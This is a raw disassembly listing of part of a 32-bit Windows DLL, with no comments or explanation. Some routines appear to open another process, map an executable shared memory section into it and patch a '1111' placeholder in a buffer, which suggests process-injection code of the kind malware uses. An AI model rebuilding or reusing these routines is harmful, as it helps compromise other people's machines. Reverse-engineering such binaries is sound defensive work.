1000d0e1:	f7 d8                	neg    %eax
1000d0e3:	1b c0                	sbb    %eax,%eax
1000d0e5:	f7 d8                	neg    %eax
1000d0e7:	c3                   	ret    
1000d0e8:	51                   	push   %ecx
1000d0e9:	56                   	push   %esi
1000d0ea:	57                   	push   %edi
1000d0eb:	e8 b6 d2 ff ff       	call   0x1000a3a6
1000d0f0:	85 c0                	test   %eax,%eax
1000d0f2:	74 07                	je     0x1000d0fb
1000d0f4:	e8 25 b5 ff ff       	call   0x1000861e
1000d0f9:	eb 02                	jmp    0x1000d0fd
1000d0fb:	33 c0                	xor    %eax,%eax
1000d0fd:	8b f8                	mov    %eax,%edi
1000d0ff:	89 3d 64 36 01 10    	mov    %edi,0x10013664
1000d105:	85 ff                	test   %edi,%edi
1000d107:	75 04                	jne    0x1000d10d
1000d109:	33 c0                	xor    %eax,%eax
1000d10b:	eb 25                	jmp    0x1000d132
1000d10d:	8b c7                	mov    %edi,%eax
1000d10f:	e8 cc e2 ff ff       	call   0x1000b3e0
1000d114:	85 c0                	test   %eax,%eax
1000d116:	75 12                	jne    0x1000d12a
1000d118:	8b c7                	mov    %edi,%eax
1000d11a:	8b f7                	mov    %edi,%esi
1000d11c:	e8 0c b5 ff ff       	call   0x1000862d
1000d121:	56                   	push   %esi
1000d122:	e8 26 ab ff ff       	call   0x10007c4d
1000d127:	59                   	pop    %ecx
1000d128:	eb df                	jmp    0x1000d109
1000d12a:	e8 09 b5 ff ff       	call   0x10008638
1000d12f:	33 c0                	xor    %eax,%eax
1000d131:	40                   	inc    %eax
1000d132:	5f                   	pop    %edi
1000d133:	5e                   	pop    %esi
1000d134:	59                   	pop    %ecx
1000d135:	c3                   	ret    
1000d136:	a1 64 36 01 10       	mov    0x10013664,%eax
1000d13b:	56                   	push   %esi
1000d13c:	8b f0                	mov    %eax,%esi
1000d13e:	85 c0                	test   %eax,%eax
1000d140:	74 0c                	je     0x1000d14e
1000d142:	e8 e6 b4 ff ff       	call   0x1000862d
1000d147:	56                   	push   %esi
1000d148:	e8 00 ab ff ff       	call   0x10007c4d
1000d14d:	59                   	pop    %ecx
1000d14e:	5e                   	pop    %esi
1000d14f:	c3                   	ret    
1000d150:	55                   	push   %ebp
1000d151:	8b ec                	mov    %esp,%ebp
1000d153:	83 e4 f8             	and    $0xfffffff8,%esp
1000d156:	81 ec 9c 01 00 00    	sub    $0x19c,%esp
1000d15c:	53                   	push   %ebx
1000d15d:	56                   	push   %esi
1000d15e:	57                   	push   %edi
1000d15f:	8d 44 24 18          	lea    0x18(%esp),%eax
1000d163:	50                   	push   %eax
1000d164:	68 02 02 00 00       	push   $0x202
1000d169:	ff 15 50 e2 00 10    	call   *0x1000e250
1000d16f:	85 c0                	test   %eax,%eax
1000d171:	74 07                	je     0x1000d17a
1000d173:	33 c0                	xor    %eax,%eax
1000d175:	e9 e4 02 00 00       	jmp    0x1000d45e
1000d17a:	e8 36 98 ff ff       	call   0x100069b5
1000d17f:	85 c0                	test   %eax,%eax
1000d181:	74 f0                	je     0x1000d173
1000d183:	e8 23 ff ff ff       	call   0x1000d0ab
1000d188:	85 c0                	test   %eax,%eax
1000d18a:	75 e7                	jne    0x1000d173
1000d18c:	e8 b3 eb ff ff       	call   0x1000bd44
1000d191:	8b 45 08             	mov    0x8(%ebp),%eax
1000d194:	a3 d0 32 01 10       	mov    %eax,0x100132d0
1000d199:	8d 44 24 10          	lea    0x10(%esp),%eax
1000d19d:	50                   	push   %eax
1000d19e:	8d 44 24 10          	lea    0x10(%esp),%eax
1000d1a2:	33 db                	xor    %ebx,%ebx
1000d1a4:	50                   	push   %eax
1000d1a5:	89 5c 24 14          	mov    %ebx,0x14(%esp)
1000d1a9:	89 5c 24 18          	mov    %ebx,0x18(%esp)
1000d1ad:	e8 83 ee ff ff       	call   0x1000c035
1000d1b2:	85 c0                	test   %eax,%eax
1000d1b4:	74 bd                	je     0x1000d173
1000d1b6:	81 3d ec 36 01 10 28 	cmpl   $0x2328,0x100136ec
1000d1bd:	23 00 00 
1000d1c0:	bf 78 36 01 10       	mov    $0x10013678,%edi
1000d1c5:	89 1d 7c 36 01 10    	mov    %ebx,0x1001367c
1000d1cb:	8b c7                	mov    %edi,%eax
1000d1cd:	72 07                	jb     0x1000d1d6
1000d1cf:	68 78 f5 00 10       	push   $0x1000f578
1000d1d4:	eb 05                	jmp    0x1000d1db
1000d1d6:	68 28 f6 00 10       	push   $0x1000f628
1000d1db:	e8 44 eb ff ff       	call   0x1000bd24
1000d1e0:	59                   	pop    %ecx
1000d1e1:	85 c0                	test   %eax,%eax
1000d1e3:	75 06                	jne    0x1000d1eb
1000d1e5:	89 1d 7c 36 01 10    	mov    %ebx,0x1001367c
1000d1eb:	33 f6                	xor    %esi,%esi
1000d1ed:	39 1d 7c 36 01 10    	cmp    %ebx,0x1001367c
1000d1f3:	74 02                	je     0x1000d1f7
1000d1f5:	8b f7                	mov    %edi,%esi
1000d1f7:	e8 ec fe ff ff       	call   0x1000d0e8
1000d1fc:	85 c0                	test   %eax,%eax
1000d1fe:	75 0a                	jne    0x1000d20a
1000d200:	e8 24 98 ff ff       	call   0x10006a29
1000d205:	e9 69 ff ff ff       	jmp    0x1000d173
1000d20a:	e8 15 e9 ff ff       	call   0x1000bb24
1000d20f:	3b c3                	cmp    %ebx,%eax
1000d211:	74 09                	je     0x1000d21c
1000d213:	8b d0                	mov    %eax,%edx
1000d215:	e8 8a e8 ff ff       	call   0x1000baa4
1000d21a:	eb 02                	jmp    0x1000d21e
1000d21c:	33 c0                	xor    %eax,%eax
1000d21e:	8b 5c 24 10          	mov    0x10(%esp),%ebx
1000d222:	53                   	push   %ebx
1000d223:	a3 74 36 01 10       	mov    %eax,0x10013674
1000d228:	e8 b7 97 ff ff       	call   0x100069e4
1000d22d:	8b f8                	mov    %eax,%edi
1000d22f:	59                   	pop    %ecx
1000d230:	85 ff                	test   %edi,%edi
1000d232:	74 51                	je     0x1000d285
1000d234:	53                   	push   %ebx
1000d235:	57                   	push   %edi
1000d236:	ff 74 24 14          	pushl  0x14(%esp)
1000d23a:	e8 64 8b ff ff       	call   0x10005da3
1000d23f:	83 c4 0c             	add    $0xc,%esp
1000d242:	8b d8                	mov    %eax,%ebx
1000d244:	e8 f8 a9 ff ff       	call   0x10007c41
1000d249:	85 c0                	test   %eax,%eax
1000d24b:	74 1e                	je     0x1000d26b
1000d24d:	ff 35 d0 32 01 10    	pushl  0x100132d0
1000d253:	53                   	push   %ebx
1000d254:	57                   	push   %edi
1000d255:	ff 35 74 36 01 10    	pushl  0x10013674
1000d25b:	ff 35 64 36 01 10    	pushl  0x10013664
1000d261:	56                   	push   %esi
1000d262:	8b f0                	mov    %eax,%esi
1000d264:	e8 ed a9 ff ff       	call   0x10007c56
1000d269:	eb 02                	jmp    0x1000d26d
1000d26b:	33 c0                	xor    %eax,%eax
1000d26d:	53                   	push   %ebx
1000d26e:	6a 00                	push   $0x0
1000d270:	57                   	push   %edi
1000d271:	a3 68 36 01 10       	mov    %eax,0x10013668
1000d276:	e8 af 0a 00 00       	call   0x1000dd2a
1000d27b:	83 c4 0c             	add    $0xc,%esp
1000d27e:	57                   	push   %edi
1000d27f:	e8 8f 97 ff ff       	call   0x10006a13
1000d284:	59                   	pop    %ecx
1000d285:	8b 35 68 36 01 10    	mov    0x10013668,%esi
1000d28b:	85 f6                	test   %esi,%esi
1000d28d:	75 0a                	jne    0x1000d299
1000d28f:	e8 a2 fe ff ff       	call   0x1000d136
1000d294:	e9 67 ff ff ff       	jmp    0x1000d200
1000d299:	8b c6                	mov    %esi,%eax
1000d29b:	e8 ee b2 ff ff       	call   0x1000858e
1000d2a0:	85 c0                	test   %eax,%eax
1000d2a2:	75 10                	jne    0x1000d2b4
1000d2a4:	8b fe                	mov    %esi,%edi
1000d2a6:	e8 33 ad ff ff       	call   0x10007fde
1000d2ab:	57                   	push   %edi
1000d2ac:	e8 9c a9 ff ff       	call   0x10007c4d
1000d2b1:	59                   	pop    %ecx
1000d2b2:	eb db                	jmp    0x1000d28f
1000d2b4:	e8 44 60 ff ff       	call   0x100032fd
1000d2b9:	85 c0                	test   %eax,%eax
1000d2bb:	74 09                	je     0x1000d2c6
1000d2bd:	8b f8                	mov    %eax,%edi
1000d2bf:	e8 5a 5f ff ff       	call   0x1000321e
1000d2c4:	eb 02                	jmp    0x1000d2c8
1000d2c6:	33 c0                	xor    %eax,%eax
1000d2c8:	33 db                	xor    %ebx,%ebx
1000d2ca:	a3 6c 36 01 10       	mov    %eax,0x1001366c
1000d2cf:	3b c3                	cmp    %ebx,%eax
1000d2d1:	75 38                	jne    0x1000d30b
1000d2d3:	8b 35 68 36 01 10    	mov    0x10013668,%esi
1000d2d9:	8b fe                	mov    %esi,%edi
1000d2db:	3b f3                	cmp    %ebx,%esi
1000d2dd:	74 0c                	je     0x1000d2eb
1000d2df:	e8 fa ac ff ff       	call   0x10007fde
1000d2e4:	57                   	push   %edi
1000d2e5:	e8 63 a9 ff ff       	call   0x10007c4d
1000d2ea:	59                   	pop    %ecx
1000d2eb:	a1 64 36 01 10       	mov    0x10013664,%eax
1000d2f0:	8b f0                	mov    %eax,%esi
1000d2f2:	3b c3                	cmp    %ebx,%eax
1000d2f4:	0f 84 06 ff ff ff    	je     0x1000d200
1000d2fa:	e8 2e b3 ff ff       	call   0x1000862d
1000d2ff:	56                   	push   %esi
1000d300:	e8 48 a9 ff ff       	call   0x10007c4d
1000d305:	59                   	pop    %ecx
1000d306:	e9 f5 fe ff ff       	jmp    0x1000d200
1000d30b:	8b 0d 68 36 01 10    	mov    0x10013668,%ecx
1000d311:	e8 f4 6a ff ff       	call   0x10003e0a
1000d316:	89 1d c4 36 01 10    	mov    %ebx,0x100136c4
1000d31c:	89 1d c0 36 01 10    	mov    %ebx,0x100136c0
1000d322:	89 1d c8 36 01 10    	mov    %ebx,0x100136c8
1000d328:	89 1d d0 36 01 10    	mov    %ebx,0x100136d0
1000d32e:	89 1d d4 36 01 10    	mov    %ebx,0x100136d4
1000d334:	e8 70 ea ff ff       	call   0x1000bda9
1000d339:	85 c0                	test   %eax,%eax
1000d33b:	75 2e                	jne    0x1000d36b
1000d33d:	a1 6c 36 01 10       	mov    0x1001366c,%eax
1000d342:	8b f0                	mov    %eax,%esi
1000d344:	3b c3                	cmp    %ebx,%eax
1000d346:	74 0e                	je     0x1000d356
1000d348:	8b f8                	mov    %eax,%edi
1000d34a:	e8 21 5f ff ff       	call   0x10003270
1000d34f:	56                   	push   %esi
1000d350:	e8 f8 a8 ff ff       	call   0x10007c4d
1000d355:	59                   	pop    %ecx
1000d356:	8b 35 68 36 01 10    	mov    0x10013668,%esi
1000d35c:	8b fe                	mov    %esi,%edi
1000d35e:	85 f6                	test   %esi,%esi
1000d360:	0f 84 29 ff ff ff    	je     0x1000d28f
1000d366:	e9 3b ff ff ff       	jmp    0x1000d2a6
1000d36b:	e8 b4 e7 ff ff       	call   0x1000bb24
1000d370:	3b c3                	cmp    %ebx,%eax
1000d372:	74 13                	je     0x1000d387
1000d374:	ff 35 6c 36 01 10    	pushl  0x1001366c
1000d37a:	8b 15 68 36 01 10    	mov    0x10013668,%edx
1000d380:	e8 13 43 ff ff       	call   0x10001698
1000d385:	eb 02                	jmp    0x1000d389
1000d387:	33 c0                	xor    %eax,%eax
1000d389:	8b c8                	mov    %eax,%ecx
1000d38b:	89 0d 70 36 01 10    	mov    %ecx,0x10013670
1000d391:	3b cb                	cmp    %ebx,%ecx
1000d393:	74 a8                	je     0x1000d33d
1000d395:	e8 53 43 ff ff       	call   0x100016ed
1000d39a:	85 c0                	test   %eax,%eax
1000d39c:	75 15                	jne    0x1000d3b3
1000d39e:	51                   	push   %ecx
1000d39f:	e8 a9 a8 ff ff       	call   0x10007c4d
1000d3a4:	59                   	pop    %ecx
1000d3a5:	8b 3d 6c 36 01 10    	mov    0x1001366c,%edi
1000d3ab:	8b f7                	mov    %edi,%esi
1000d3ad:	85 ff                	test   %edi,%edi
1000d3af:	74 a5                	je     0x1000d356
1000d3b1:	eb 97                	jmp    0x1000d34a
1000d3b3:	ff 35 d8 36 01 10    	pushl  0x100136d8
1000d3b9:	a1 dc 36 01 10       	mov    0x100136dc,%eax
1000d3be:	ff 35 bc 36 01 10    	pushl  0x100136bc
1000d3c4:	b9 00 38 01 10       	mov    $0x10013800,%ecx
1000d3c9:	ff 35 b8 36 01 10    	pushl  0x100136b8
1000d3cf:	89 0d 84 36 01 10    	mov    %ecx,0x10013684
1000d3d5:	68 88 36 01 10       	push   $0x10013688
1000d3da:	e8 3e 06 00 00       	call   0x1000da1d
1000d3df:	85 c0                	test   %eax,%eax
1000d3e1:	75 19                	jne    0x1000d3fc
1000d3e3:	a1 70 36 01 10       	mov    0x10013670,%eax
1000d3e8:	3b c3                	cmp    %ebx,%eax
1000d3ea:	0f 84 4d ff ff ff    	je     0x1000d33d
1000d3f0:	50                   	push   %eax
1000d3f1:	e8 57 a8 ff ff       	call   0x10007c4d
1000d3f6:	59                   	pop    %ecx
1000d3f7:	e9 41 ff ff ff       	jmp    0x1000d33d
1000d3fc:	e8 24 7f ff ff       	call   0x10005325
1000d401:	8d 44 24 14          	lea    0x14(%esp),%eax
1000d405:	50                   	push   %eax
1000d406:	53                   	push   %ebx
1000d407:	68 d0 32 01 10       	push   $0x100132d0
1000d40c:	68 28 cf 00 10       	push   $0x1000cf28
1000d411:	53                   	push   %ebx
1000d412:	53                   	push   %ebx
1000d413:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
1000d417:	ff 15 54 e1 00 10    	call   *0x1000e154
1000d41d:	a3 d4 32 01 10       	mov    %eax,0x100132d4
1000d422:	3b c3                	cmp    %ebx,%eax
1000d424:	75 07                	jne    0x1000d42d
1000d426:	e8 f8 07 00 00       	call   0x1000dc23
1000d42b:	eb b6                	jmp    0x1000d3e3
1000d42d:	e8 9d fc ff ff       	call   0x1000d0cf
1000d432:	85 c0                	test   %eax,%eax
1000d434:	75 25                	jne    0x1000d45b
1000d436:	53                   	push   %ebx
1000d437:	ff 35 d4 32 01 10    	pushl  0x100132d4
1000d43d:	ff 15 6c e1 00 10    	call   *0x1000e16c
1000d443:	e8 db 07 00 00       	call   0x1000dc23
1000d448:	a1 70 36 01 10       	mov    0x10013670,%eax
1000d44d:	3b c3                	cmp    %ebx,%eax
1000d44f:	0f 84 50 ff ff ff    	je     0x1000d3a5
1000d455:	50                   	push   %eax
1000d456:	e9 44 ff ff ff       	jmp    0x1000d39f
1000d45b:	33 c0                	xor    %eax,%eax
1000d45d:	40                   	inc    %eax
1000d45e:	5f                   	pop    %edi
1000d45f:	5e                   	pop    %esi
1000d460:	5b                   	pop    %ebx
1000d461:	8b e5                	mov    %ebp,%esp
1000d463:	5d                   	pop    %ebp
1000d464:	c2 04 00             	ret    $0x4
1000d467:	55                   	push   %ebp
1000d468:	8b ec                	mov    %esp,%ebp
1000d46a:	ff 75 08             	pushl  0x8(%ebp)
1000d46d:	e8 de fc ff ff       	call   0x1000d150
1000d472:	5d                   	pop    %ebp
1000d473:	c3                   	ret    
1000d474:	56                   	push   %esi
1000d475:	57                   	push   %edi
1000d476:	6a 00                	push   $0x0
1000d478:	ff 35 d4 32 01 10    	pushl  0x100132d4
1000d47e:	ff 15 6c e1 00 10    	call   *0x1000e16c
1000d484:	e8 9a 07 00 00       	call   0x1000dc23
1000d489:	8b 3d 6c 36 01 10    	mov    0x1001366c,%edi
1000d48f:	8b f7                	mov    %edi,%esi
1000d491:	85 ff                	test   %edi,%edi
1000d493:	74 0c                	je     0x1000d4a1
1000d495:	e8 d6 5d ff ff       	call   0x10003270
1000d49a:	56                   	push   %esi
1000d49b:	e8 ad a7 ff ff       	call   0x10007c4d
1000d4a0:	59                   	pop    %ecx
1000d4a1:	8b 35 68 36 01 10    	mov    0x10013668,%esi
1000d4a7:	8b fe                	mov    %esi,%edi
1000d4a9:	85 f6                	test   %esi,%esi
1000d4ab:	74 0c                	je     0x1000d4b9
1000d4ad:	e8 2c ab ff ff       	call   0x10007fde
1000d4b2:	57                   	push   %edi
1000d4b3:	e8 95 a7 ff ff       	call   0x10007c4d
1000d4b8:	59                   	pop    %ecx
1000d4b9:	e8 78 fc ff ff       	call   0x1000d136
1000d4be:	5f                   	pop    %edi
1000d4bf:	5e                   	pop    %esi
1000d4c0:	e9 64 95 ff ff       	jmp    0x10006a29
1000d4c5:	e9 aa ff ff ff       	jmp    0x1000d474
1000d4ca:	83 c0 34             	add    $0x34,%eax
1000d4cd:	50                   	push   %eax
1000d4ce:	ff 15 64 e1 00 10    	call   *0x1000e164
1000d4d4:	33 c0                	xor    %eax,%eax
1000d4d6:	40                   	inc    %eax
1000d4d7:	c3                   	ret    
1000d4d8:	83 c0 34             	add    $0x34,%eax
1000d4db:	50                   	push   %eax
1000d4dc:	ff 15 60 e1 00 10    	call   *0x1000e160
1000d4e2:	c3                   	ret    
1000d4e3:	55                   	push   %ebp
1000d4e4:	8b ec                	mov    %esp,%ebp
1000d4e6:	eb 08                	jmp    0x1000d4f0
1000d4e8:	3b 45 08             	cmp    0x8(%ebp),%eax
1000d4eb:	74 0b                	je     0x1000d4f8
1000d4ed:	83 c1 04             	add    $0x4,%ecx
1000d4f0:	8b 01                	mov    (%ecx),%eax
1000d4f2:	85 c0                	test   %eax,%eax
1000d4f4:	75 f2                	jne    0x1000d4e8
1000d4f6:	5d                   	pop    %ebp
1000d4f7:	c3                   	ret    
1000d4f8:	33 c0                	xor    %eax,%eax
1000d4fa:	40                   	inc    %eax
1000d4fb:	5d                   	pop    %ebp
1000d4fc:	c3                   	ret    
1000d4fd:	56                   	push   %esi
1000d4fe:	33 f6                	xor    %esi,%esi
1000d500:	39 32                	cmp    %esi,(%edx)
1000d502:	74 14                	je     0x1000d518
1000d504:	8b c2                	mov    %edx,%eax
1000d506:	8b 48 04             	mov    0x4(%eax),%ecx
1000d509:	89 08                	mov    %ecx,(%eax)
1000d50b:	85 c9                	test   %ecx,%ecx
1000d50d:	74 09                	je     0x1000d518
1000d50f:	46                   	inc    %esi
1000d510:	8d 04 b2             	lea    (%edx,%esi,4),%eax
1000d513:	83 38 00             	cmpl   $0x0,(%eax)
1000d516:	75 ee                	jne    0x1000d506
1000d518:	5e                   	pop    %esi
1000d519:	c3                   	ret    
1000d51a:	55                   	push   %ebp
1000d51b:	8b ec                	mov    %esp,%ebp
1000d51d:	eb 08                	jmp    0x1000d527
1000d51f:	3b 45 08             	cmp    0x8(%ebp),%eax
1000d522:	74 0b                	je     0x1000d52f
1000d524:	83 c2 04             	add    $0x4,%edx
1000d527:	8b 02                	mov    (%edx),%eax
1000d529:	85 c0                	test   %eax,%eax
1000d52b:	75 f2                	jne    0x1000d51f
1000d52d:	5d                   	pop    %ebp
1000d52e:	c3                   	ret    
1000d52f:	5d                   	pop    %ebp
1000d530:	e9 c8 ff ff ff       	jmp    0x1000d4fd
1000d535:	55                   	push   %ebp
1000d536:	8b ec                	mov    %esp,%ebp
1000d538:	33 c9                	xor    %ecx,%ecx
1000d53a:	eb 03                	jmp    0x1000d53f
1000d53c:	83 c0 04             	add    $0x4,%eax
1000d53f:	39 08                	cmp    %ecx,(%eax)
1000d541:	75 f9                	jne    0x1000d53c
1000d543:	8b 55 08             	mov    0x8(%ebp),%edx
1000d546:	89 10                	mov    %edx,(%eax)
1000d548:	89 48 04             	mov    %ecx,0x4(%eax)
1000d54b:	5d                   	pop    %ebp
1000d54c:	c3                   	ret    
1000d54d:	55                   	push   %ebp
1000d54e:	8b ec                	mov    %esp,%ebp
1000d550:	ff 75 08             	pushl  0x8(%ebp)
1000d553:	6a 00                	push   $0x0
1000d555:	68 3a 04 00 00       	push   $0x43a
1000d55a:	ff 15 80 e0 00 10    	call   *0x1000e080
1000d560:	85 c0                	test   %eax,%eax
1000d562:	75 02                	jne    0x1000d566
1000d564:	5d                   	pop    %ebp
1000d565:	c3                   	ret    
1000d566:	50                   	push   %eax
1000d567:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d56d:	33 c0                	xor    %eax,%eax
1000d56f:	40                   	inc    %eax
1000d570:	5d                   	pop    %ebp
1000d571:	c3                   	ret    
1000d572:	55                   	push   %ebp
1000d573:	8b ec                	mov    %esp,%ebp
1000d575:	83 ec 10             	sub    $0x10,%esp
1000d578:	6a 40                	push   $0x40
1000d57a:	33 c0                	xor    %eax,%eax
1000d57c:	50                   	push   %eax
1000d57d:	6a 01                	push   $0x1
1000d57f:	8d 4d f8             	lea    -0x8(%ebp),%ecx
1000d582:	51                   	push   %ecx
1000d583:	8d 4d f0             	lea    -0x10(%ebp),%ecx
1000d586:	51                   	push   %ecx
1000d587:	50                   	push   %eax
1000d588:	50                   	push   %eax
1000d589:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000d58c:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000d58f:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000d592:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000d595:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000d598:	50                   	push   %eax
1000d599:	ff 75 08             	pushl  0x8(%ebp)
1000d59c:	ff 75 0c             	pushl  0xc(%ebp)
1000d59f:	ff 15 68 38 01 10    	call   *0x10013868
1000d5a5:	85 c0                	test   %eax,%eax
1000d5a7:	79 04                	jns    0x1000d5ad
1000d5a9:	33 c0                	xor    %eax,%eax
1000d5ab:	eb 03                	jmp    0x1000d5b0
1000d5ad:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000d5b0:	c9                   	leave  
1000d5b1:	c2 08 00             	ret    $0x8
1000d5b4:	55                   	push   %ebp
1000d5b5:	8b ec                	mov    %esp,%ebp
1000d5b7:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
1000d5bd:	ff 75 0c             	pushl  0xc(%ebp)
1000d5c0:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
1000d5c6:	e8 1d bb ff ff       	call   0x100090e8
1000d5cb:	59                   	pop    %ecx
1000d5cc:	ff 75 08             	pushl  0x8(%ebp)
1000d5cf:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
1000d5d5:	ff 75 08             	pushl  0x8(%ebp)
1000d5d8:	ff 75 10             	pushl  0x10(%ebp)
1000d5db:	6a 00                	push   $0x0
1000d5dd:	50                   	push   %eax
1000d5de:	6a 40                	push   $0x40
1000d5e0:	59                   	pop    %ecx
1000d5e1:	e8 20 c5 ff ff       	call   0x10009b06
1000d5e6:	83 c4 14             	add    $0x14,%esp
1000d5e9:	c9                   	leave  
1000d5ea:	c3                   	ret    
1000d5eb:	55                   	push   %ebp
1000d5ec:	8b ec                	mov    %esp,%ebp
1000d5ee:	81 ec 18 01 00 00    	sub    $0x118,%esp
1000d5f4:	ff 75 10             	pushl  0x10(%ebp)
1000d5f7:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
1000d5fd:	e8 e6 ba ff ff       	call   0x100090e8
1000d602:	8b 45 08             	mov    0x8(%ebp),%eax
1000d605:	59                   	pop    %ecx
1000d606:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000d609:	83 c0 40             	add    $0x40,%eax
1000d60c:	50                   	push   %eax
1000d60d:	50                   	push   %eax
1000d60e:	ff 75 14             	pushl  0x14(%ebp)
1000d611:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
1000d617:	6a 00                	push   $0x0
1000d619:	83 c1 c0             	add    $0xffffffc0,%ecx
1000d61c:	50                   	push   %eax
1000d61d:	e8 e4 c4 ff ff       	call   0x10009b06
1000d622:	83 c4 14             	add    $0x14,%esp
1000d625:	c9                   	leave  
1000d626:	c3                   	ret    
1000d627:	55                   	push   %ebp
1000d628:	8b ec                	mov    %esp,%ebp
1000d62a:	57                   	push   %edi
1000d62b:	33 ff                	xor    %edi,%edi
1000d62d:	57                   	push   %edi
1000d62e:	ff 75 10             	pushl  0x10(%ebp)
1000d631:	57                   	push   %edi
1000d632:	6a 40                	push   $0x40
1000d634:	57                   	push   %edi
1000d635:	6a ff                	push   $0xffffffff
1000d637:	ff 15 f8 e0 00 10    	call   *0x1000e0f8
1000d63d:	89 06                	mov    %eax,(%esi)
1000d63f:	3b c7                	cmp    %edi,%eax
1000d641:	74 41                	je     0x1000d684
1000d643:	57                   	push   %edi
1000d644:	57                   	push   %edi
1000d645:	57                   	push   %edi
1000d646:	6a 0e                	push   $0xe
1000d648:	50                   	push   %eax
1000d649:	ff 15 e8 e0 00 10    	call   *0x1000e0e8
1000d64f:	89 03                	mov    %eax,(%ebx)
1000d651:	3b c7                	cmp    %edi,%eax
1000d653:	74 25                	je     0x1000d67a
1000d655:	ff 75 10             	pushl  0x10(%ebp)
1000d658:	ff 75 0c             	pushl  0xc(%ebp)
1000d65b:	50                   	push   %eax
1000d65c:	e8 af 06 00 00       	call   0x1000dd10
1000d661:	83 c4 0c             	add    $0xc,%esp
1000d664:	ff 36                	pushl  (%esi)
1000d666:	ff 75 08             	pushl  0x8(%ebp)
1000d669:	e8 04 ff ff ff       	call   0x1000d572
1000d66e:	3b c7                	cmp    %edi,%eax
1000d670:	75 14                	jne    0x1000d686
1000d672:	ff 33                	pushl  (%ebx)
1000d674:	ff 15 ec e0 00 10    	call   *0x1000e0ec
1000d67a:	ff 36                	pushl  (%esi)
1000d67c:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d682:	89 3e                	mov    %edi,(%esi)
1000d684:	33 c0                	xor    %eax,%eax
1000d686:	5f                   	pop    %edi
1000d687:	5d                   	pop    %ebp
1000d688:	c3                   	ret    
1000d689:	55                   	push   %ebp
1000d68a:	8b ec                	mov    %esp,%ebp
1000d68c:	ff 75 14             	pushl  0x14(%ebp)
1000d68f:	ff 15 ec e0 00 10    	call   *0x1000e0ec
1000d695:	ff 75 0c             	pushl  0xc(%ebp)
1000d698:	ff 75 08             	pushl  0x8(%ebp)
1000d69b:	ff 15 64 38 01 10    	call   *0x10013864
1000d6a1:	ff 75 10             	pushl  0x10(%ebp)
1000d6a4:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d6aa:	5d                   	pop    %ebp
1000d6ab:	c3                   	ret    
1000d6ac:	56                   	push   %esi
1000d6ad:	57                   	push   %edi
1000d6ae:	8d b8 00 04 00 00    	lea    0x400(%eax),%edi
1000d6b4:	8b f0                	mov    %eax,%esi
1000d6b6:	3b c7                	cmp    %edi,%eax
1000d6b8:	73 15                	jae    0x1000d6cf
1000d6ba:	68 b0 f6 00 10       	push   $0x1000f6b0
1000d6bf:	56                   	push   %esi
1000d6c0:	ff 15 30 e1 00 10    	call   *0x1000e130
1000d6c6:	85 c0                	test   %eax,%eax
1000d6c8:	74 05                	je     0x1000d6cf
1000d6ca:	46                   	inc    %esi
1000d6cb:	3b f7                	cmp    %edi,%esi
1000d6cd:	72 eb                	jb     0x1000d6ba
1000d6cf:	5f                   	pop    %edi
1000d6d0:	8d 46 0f             	lea    0xf(%esi),%eax
1000d6d3:	5e                   	pop    %esi
1000d6d4:	c3                   	ret    
1000d6d5:	55                   	push   %ebp
1000d6d6:	8b ec                	mov    %esp,%ebp
1000d6d8:	8d 48 3d             	lea    0x3d(%eax),%ecx
1000d6db:	eb 09                	jmp    0x1000d6e6
1000d6dd:	81 38 31 31 31 31    	cmpl   $0x31313131,(%eax)
1000d6e3:	74 07                	je     0x1000d6ec
1000d6e5:	40                   	inc    %eax
1000d6e6:	3b c1                	cmp    %ecx,%eax
1000d6e8:	72 f3                	jb     0x1000d6dd
1000d6ea:	5d                   	pop    %ebp
1000d6eb:	c3                   	ret    
1000d6ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000d6ef:	89 08                	mov    %ecx,(%eax)
1000d6f1:	5d                   	pop    %ebp
1000d6f2:	c3                   	ret    
1000d6f3:	55                   	push   %ebp
1000d6f4:	8b ec                	mov    %esp,%ebp
1000d6f6:	83 e4 f8             	and    $0xfffffff8,%esp
1000d6f9:	83 ec 24             	sub    $0x24,%esp
1000d6fc:	53                   	push   %ebx
1000d6fd:	56                   	push   %esi
1000d6fe:	57                   	push   %edi
1000d6ff:	ff 75 10             	pushl  0x10(%ebp)
1000d702:	33 ff                	xor    %edi,%edi
1000d704:	ff 75 0c             	pushl  0xc(%ebp)
1000d707:	8d 5c 24 18          	lea    0x18(%esp),%ebx
1000d70b:	ff 75 08             	pushl  0x8(%ebp)
1000d70e:	8d 74 24 20          	lea    0x20(%esp),%esi
1000d712:	89 7c 24 20          	mov    %edi,0x20(%esp)
1000d716:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
1000d71a:	e8 08 ff ff ff       	call   0x1000d627
1000d71f:	8b f0                	mov    %eax,%esi
1000d721:	83 c4 0c             	add    $0xc,%esp
1000d724:	3b f7                	cmp    %edi,%esi
1000d726:	75 07                	jne    0x1000d72f
1000d728:	33 c0                	xor    %eax,%eax
1000d72a:	e9 f3 00 00 00       	jmp    0x1000d822
1000d72f:	6a 10                	push   $0x10
1000d731:	ff 75 18             	pushl  0x18(%ebp)
1000d734:	8d 44 24 28          	lea    0x28(%esp),%eax
1000d738:	50                   	push   %eax
1000d739:	e8 d2 05 00 00       	call   0x1000dd10
1000d73e:	83 c4 0c             	add    $0xc,%esp
1000d741:	8d 44 24 20          	lea    0x20(%esp),%eax
1000d745:	50                   	push   %eax
1000d746:	ff 75 14             	pushl  0x14(%ebp)
1000d749:	ff 74 24 18          	pushl  0x18(%esp)
1000d74d:	e8 62 fe ff ff       	call   0x1000d5b4
1000d752:	83 c4 0c             	add    $0xc,%esp
1000d755:	e8 8c 7a ff ff       	call   0x100051e6
1000d75a:	8b d8                	mov    %eax,%ebx
1000d75c:	8b 44 24 10          	mov    0x10(%esp),%eax
